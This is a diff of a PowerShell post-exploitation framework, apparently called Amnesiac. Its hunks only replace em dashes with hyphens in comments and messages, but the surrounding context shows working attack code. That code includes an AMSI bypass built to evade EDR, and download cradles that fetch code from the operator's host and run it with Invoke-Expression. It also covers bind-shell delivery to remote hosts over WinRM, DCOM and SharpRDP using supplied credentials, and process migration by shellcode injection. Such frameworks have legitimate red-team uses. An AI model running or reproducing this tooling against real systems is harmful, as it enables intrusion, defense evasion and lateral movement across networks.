@@ -46,7 +46,7 @@ function Get-AmsiBypassSnippet {
         }
 
         { $_ -in 'pageguard','hwbp' } {
-            # Pure .NET reflection — null both amsiContext and amsiSession.
+            # Pure .NET reflection -null both amsiContext and amsiSession.
             # Zero kernel32 calls: nothing for EDR hooks to intercept.
             # All strings char-array encoded: no literal AmsiUtils/field names in payload.
             # amsiContext  = [char[]](97,109,115,105,67,111,110,116,101,120,116)
@@ -361,7 +361,7 @@ function Fetch-ToolFromGitHub {
 
     foreach ($url in $urls) {
         try {
-            Write-Output " [*] '$ToolName' not in cache — fetching from $url ..."
+            Write-Output " [*] '$ToolName' not in cache -fetching from $url ..."
             $code = (New-Object Net.WebClient).DownloadString($url)
             $global:ToolCache[$ToolName] = $code
             Write-Output " [+] '$ToolName' cached."
@@ -448,7 +448,7 @@ function Test-NetworkLogonToken {
     # Returns identity name string if domain credentials are active in this process, $false otherwise.
     # Detects two cases:
     #   1. Primary token is a domain user (domain-joined machine or full runas logon)
-    #   2. Type-9 NewCredentials logon session (runas /netonly) — GetCurrent() returns the local
+    #   2. Type-9 NewCredentials logon session (runas /netonly) -GetCurrent() returns the local
     #      primary token even though all network access uses the domain credentials in the LSA cache
     try {
         $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
@@ -1666,8 +1666,8 @@ exit
 			'6' {
 				Write-Output ""
 				Write-Output " Set engagement profile:"
-				Write-Output "   [1] nondomained  — runas /netonly operator (Scenario 1)"
-				Write-Output "   [2] domained     — assumed breach box (Scenario 2)"
+				Write-Output "   [1] nondomained  -runas /netonly operator (Scenario 1)"
+				Write-Output "   [2] domained     -assumed breach box (Scenario 2)"
 				Write-Output ""
 				Write-Host " Profile [1/2 or name]: " -ForegroundColor Yellow -NoNewline
 				$_ep = (Read-Host).Trim().ToLower()
@@ -1686,7 +1686,7 @@ exit
 						$global:EngagementProfile = 'domained'
 						$global:Message = " [+] Engagement: domained (assumed breach)"
 					}
-					default { $global:Message = " [-] Unknown profile — enter 1/nondomained or 2/domained" }
+					default { $global:Message = " [-] Unknown profile -enter 1/nondomained or 2/domained" }
 				}
 			}
 			default {
@@ -1844,7 +1844,7 @@ function Start-LocalShell {
             Write-Output ' [+] TLS 1.2 enabled for this session.'
         }
         'GetSystem' = {
-            Write-Output ' [-] GetSystem spawns a new pipe session as SYSTEM — not supported in local shell.'
+            Write-Output ' [-] GetSystem spawns a new pipe session as SYSTEM -not supported in local shell.'
             Write-Output '     Use from a remote session instead.'
         }
         'Migrate' = {
@@ -1874,8 +1874,8 @@ function Start-LocalShell {
         'PatchNet'         = @{ tools=@('NETAMSI');                                              invoke=$null }
         'PInject'          = @{ tools=@('PInject');                                              invoke=$null
                                 hint=@(" [*] Run 'Process' to find a target PID, then:"
-                                       " [*]   Migrate ps <pid>   — stealth (AmnesiacLoader, recommended)"
-                                       " [*]   Migrate <pid>      — shellcode injection via PInject") }
+                                       " [*]   Migrate ps <pid>   -stealth (AmnesiacLoader, recommended)"
+                                       " [*]   Migrate <pid>      -shellcode injection via PInject") }
         'PowerView'        = @{ tools=@('pwv');                                                  invoke=$null
                                 hint=@(" [*] Key: Get-Domain | Get-DomainUser | Get-DomainComputer | Get-DomainGroup"
                                        " [*]   Find-DomainShare | select Name,ComputerName,Path"
@@ -2162,21 +2162,21 @@ function Start-LocalShell {
             continue
         }
 
-        # ── winrm: PSRemoting delivery — no session, no local admin needed ──────
+        # ── winrm: PSRemoting delivery -no session, no local admin needed ──────
         if ($cmd -match '^winrm\b(.*)') {
             $_wArgs = $Matches[1].Trim()
             if (-not $_wArgs -or $_wArgs -match '^help$') {
                 Write-Output " Usage: winrm computername=<IP> username=<domain\user> password=<pass>"
-                Write-Output "        Delivers bind shell payload via WinRM — no active session required."
+                Write-Output "        Delivers bind shell payload via WinRM -no active session required."
                 Write-Output "        Requires target user in 'Remote Management Users' (port 5985)."
-                if (-not $global:LastInlinePS) { Write-Output " [!] No payload ready — go through Bind Shell menu first." }
+                if (-not $global:LastInlinePS) { Write-Output " [!] No payload ready -go through Bind Shell menu first." }
                 continue
             }
             $_wF = @{}
             ($_wArgs -split '\s+') | ForEach-Object { if ($_ -match '^([^=]+)=(.*)$') { $_wF[$Matches[1].ToLower()] = $Matches[2] } }
             $_wTarget = $_wF['computername']; $_wUser = $_wF['username']; $_wPass = $_wF['password']
             if (-not $_wTarget -or -not $_wUser -or -not $_wPass) { Write-Output " [!] computername, username, and password are all required."; continue }
-            if (-not $global:LastInlinePS) { Write-Output " [!] No payload ready — go through Bind Shell menu first, then run winrm."; continue }
+            if (-not $global:LastInlinePS) { Write-Output " [!] No payload ready -go through Bind Shell menu first, then run winrm."; continue }
             $_wSec  = ConvertTo-SecureString $_wPass -AsPlainText -Force
             $_wCred = New-Object System.Management.Automation.PSCredential($_wUser, $_wSec)
             Write-Output " [*] Testing WinRM on $_wTarget ..."
@@ -2193,7 +2193,7 @@ function Start-LocalShell {
                 $null = Invoke-Command -ComputerName $_wTarget -Credential $_wCred -Authentication Negotiate `
                     -ScriptBlock $_wSB -AsJob -JobName "Amnesiac_$_wTarget"
                 Write-Output " [+] Payload delivered to $_wTarget via WinRM (running as background job)"
-                Write-Output " [*] Type 'back' — listener will catch the named pipe session"
+                Write-Output " [*] Type 'back' -listener will catch the named pipe session"
                 $global:AllUserDefinedTargets = @((@($global:AllUserDefinedTargets) + $_wTarget) | Where-Object { $_ } | Select-Object -Unique)
             } catch {
                 Write-Output " [-] WinRM delivery failed: $($_.Exception.Message)"
@@ -2232,7 +2232,7 @@ function Start-LocalShell {
                         try { $_t.EndConnect($_ar) } catch {}
                         try {
                             Test-WSMan -ComputerName $_wsH -Credential $_wsCred -Authentication Negotiate -ErrorAction Stop | Out-Null
-                            Write-Output " [+] $_wsH — WinRM OK"
+                            Write-Output " [+] $_wsH -WinRM OK"
                             $_wsHits.Add($_wsH)
                         } catch {
                             $_em = $_.Exception.Message
@@ -2240,7 +2240,7 @@ function Start-LocalShell {
                                 elseif ($_em -match 'Code="16"') { 'auth failed (bad creds or Kerberos issue)' }
                                 elseif ($_em -match 'Code="(\d+)"') { "WSManFault code=$($Matches[1])" }
                                 else { $_.Exception.Message -replace '\s+',' ' | ForEach-Object { if ($_.Length -gt 80) { $_.Substring(0,80)+'...' } else { $_ } } }
-                            Write-Output " [-] $_wsH — $_hint"
+                            Write-Output " [-] $_wsH -$_hint"
                         }
                     }
                 } catch {} finally { $_t.Close() }
@@ -2254,15 +2254,15 @@ function Start-LocalShell {
             continue
         }
 
-        # ── dcom: DCOM-based delivery — no local admin, needs active session ─────
+        # ── dcom: DCOM-based delivery -no local admin, needs active session ─────
         if ($cmd -match '^dcom\b(.*)') {
             $_dArgs = $Matches[1].Trim()
             if (-not $_dArgs -or $_dArgs -match '^help$') {
                 Write-Output " Usage: dcom computername=<IP> [method=ShellWindows|ShellBrowserWindow|MMC20]"
-                Write-Output "        Default: ShellWindows — no local admin, requires active interactive session on target."
+                Write-Output "        Default: ShellWindows -no local admin, requires active interactive session on target."
                 Write-Output "        ShellBrowserWindow: fallback if ShellWindows fails."
                 Write-Output "        MMC20: requires local admin on target."
-                if (-not $global:LastSharpRDPCradleFile) { Write-Output " [!] No pipe payload — generate a stealth bind shell payload first." }
+                if (-not $global:LastSharpRDPCradleFile) { Write-Output " [!] No pipe payload -generate a stealth bind shell payload first." }
                 continue
             }
             $_dF = @{}
@@ -2270,10 +2270,10 @@ function Start-LocalShell {
             $_dTarget = $_dF['computername']
             $_dMethod = if ($_dF['method']) { $_dF['method'] } else { 'ShellWindows' }
             if (-not $_dTarget) { Write-Output " [!] computername is required."; continue }
-            if (-not $global:LastSharpRDPCradleFile) { Write-Output " [!] No pipe payload — generate a stealth bind shell payload first."; continue }
+            if (-not $global:LastSharpRDPCradleFile) { Write-Output " [!] No pipe payload -generate a stealth bind shell payload first."; continue }
             $_dServeOk = $false
             try { $_t2 = [Net.Sockets.TcpClient]::new(); $_t2.Connect('127.0.0.1', 8080); $_t2.Close(); $_dServeOk = $true } catch {}
-            if (-not $_dServeOk) { Write-Output " [!] serve not running — DCOM delivery needs serve (target downloads payload via HTTP). Run 'serve' first."; continue }
+            if (-not $_dServeOk) { Write-Output " [!] serve not running -DCOM delivery needs serve (target downloads payload via HTTP). Run 'serve' first."; continue }
             $_dOpIP   = if ($global:IP) { $global:IP } else { $env:COMPUTERNAME }
             $_dCradle = "-nop -ep bypass -w hidden -c `"iex(new-object net.webclient).downloadstring('http://${_dOpIP}:8080/$global:LastSharpRDPCradleFile')`""
             $_dOk     = $false
@@ -2302,7 +2302,7 @@ function Start-LocalShell {
                 if ($_dOk) {
                     Write-Output " [+] DCOM ($_dMethod) executed on $_dTarget"
                     $global:AllUserDefinedTargets = @((@($global:AllUserDefinedTargets) + $_dTarget) | Where-Object { $_ } | Select-Object -Unique)
-                    Write-Output " [*] Bind shell target registered: $_dTarget — type 'back' to start listener"
+                    Write-Output " [*] Bind shell target registered: $_dTarget -type 'back' to start listener"
                 }
             } catch {
                 Write-Output " [-] DCOM failed ($_dMethod): $($_.Exception.Message)"
@@ -2321,7 +2321,7 @@ function Start-LocalShell {
                 try {
                     Invoke-Expression $global:ToolCache[$cacheKey]
                     if ($rdpArgs) {
-                        Write-Output " [+] Invoke-SharpRDP loaded — executing..."
+                        Write-Output " [+] Invoke-SharpRDP loaded -executing..."
                         # Load SharpRDP assembly directly to bypass Invoke-SharpRDP's Split(" ")
                         if (-not ([System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq 'SharpRDP' })) {
                             $_srdpM = [regex]::Match($global:ToolCache[$cacheKey], '"(H4sI[A-Za-z0-9+/=]{100,})"')
@@ -2345,13 +2345,13 @@ function Start-LocalShell {
                                 "command=$_srdpPS"
                             ))
                         } else {
-                            Write-Output " [!] No pipe payload file — generate a stealth bind shell payload first"
+                            Write-Output " [!] No pipe payload file -generate a stealth bind shell payload first"
                         }
                         if ($rdpArgs -match '(?i)computername=([^\s]+)') {
                             $_rdpTarget = $Matches[1].Trim()
                             if ($_rdpTarget) {
                                 $global:AllUserDefinedTargets = @((@($global:AllUserDefinedTargets) + $_rdpTarget) | Where-Object { $_ } | Select-Object -Unique)
-                                Write-Output " [*] Bind shell target registered: $_rdpTarget — listener ready, type 'back'"
+                                Write-Output " [*] Bind shell target registered: $_rdpTarget -listener ready, type 'back'"
                             }
                         }
                     } else {
@@ -2361,10 +2361,10 @@ function Start-LocalShell {
                             Write-Output " [*] command= value refreshed in clipboard."
                             if ($global:LastSharpRDPCradleFile) {
                                 $_opIP = if ($global:IP) { $global:IP } else { $env:COMPUTERNAME }
-                                Write-Output " [!] Ensure 'serve' is running — target fetches: http://$_opIP`:8080/$($global:LastSharpRDPCradleFile)"
+                                Write-Output " [!] Ensure 'serve' is running -target fetches: http://$_opIP`:8080/$($global:LastSharpRDPCradleFile)"
                             }
                         } else {
-                            Write-Output " [*] No payload yet — generate a stealth bind shell payload first."
+                            Write-Output " [*] No payload yet -generate a stealth bind shell payload first."
                         }
                         Write-Output "     sharprdp computername=<IP> username=<domain>\<user> password=<pass>"
                         Write-Output "     (command= is auto-built from pipe payload -- no need to paste b64)"
@@ -2382,10 +2382,10 @@ function Start-LocalShell {
         if ($cmd -imatch '^Migrate\s+ps\s+(\d+)$') {
             $targetPid = [int]$Matches[1]
             if (-not $AmnesiacLoaderB64) {
-                Write-Output " [!] AmnesiacLoader not embedded — run AmnesiacLoader\Build.ps1 first."; continue
+                Write-Output " [!] AmnesiacLoader not embedded -run AmnesiacLoader\Build.ps1 first."; continue
             }
             if (-not $_alNs -or -not $_alInj -or -not $_alInPS) {
-                Write-Output " [!] AL name-map vars not set — run AmnesiacLoader\Build.ps1 and reload."; continue
+                Write-Output " [!] AL name-map vars not set -run AmnesiacLoader\Build.ps1 and reload."; continue
             }
             $_alMig = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq $_alNs } | Select-Object -First 1
             if (-not $_alMig) {
@@ -2519,14 +2519,14 @@ function Display-SessionMenu {
     # Display Available Options
     Write-Output " Available Options:"
     Write-Output " [0] Scan network for Admin Access"
-    Write-Output " [1] Reverse Shell  — target calls back to you"
-	Write-Output " [2] Bind Shell     — you connect to target"
+    Write-Output " [1] Reverse Shell  -target calls back to you"
+	Write-Output " [2] Bind Shell     -you connect to target"
 	Write-Output " [3] Scan network for listening targets"
 	Write-Output " [4] Shell via Find-LocalAdminAccess"
-	Write-Output " [5] Local Shell  — run commands on this machine directly"
-	Write-Output " [6] Set engagement profile  — domained / nondomained"
+	Write-Output " [5] Local Shell  -run commands on this machine directly"
+	Write-Output " [6] Set engagement profile  -domained / nondomained"
 
-    # Always show where Amnesiac is running — operator context
+    # Always show where Amnesiac is running -operator context
     $_localFQDN = try { [System.Net.Dns]::GetHostByName($env:COMPUTERNAME).HostName } catch { $env:COMPUTERNAME }
     $_localUser = if ($env:USERDOMAIN -and $env:USERDOMAIN -ne $env:COMPUTERNAME) { "$env:USERDOMAIN\$env:USERNAME" } else { $env:USERNAME }
     Write-Output ""
@@ -3020,7 +3020,7 @@ function Scan-WaitingTargets{
         }
     }
 
-    # Collect results — each runspace gets 5s wall-clock; net use + SMB auth can stall
+    # Collect results -each runspace gets 5s wall-clock; net use + SMB auth can stall
     # longer than the 500ms pipe-connect timeout, so we must guard EndInvoke independently.
     foreach ($runspace in $runspaces) {
         if ($runspace.Handle.AsyncWaitHandle.WaitOne(5000)) {
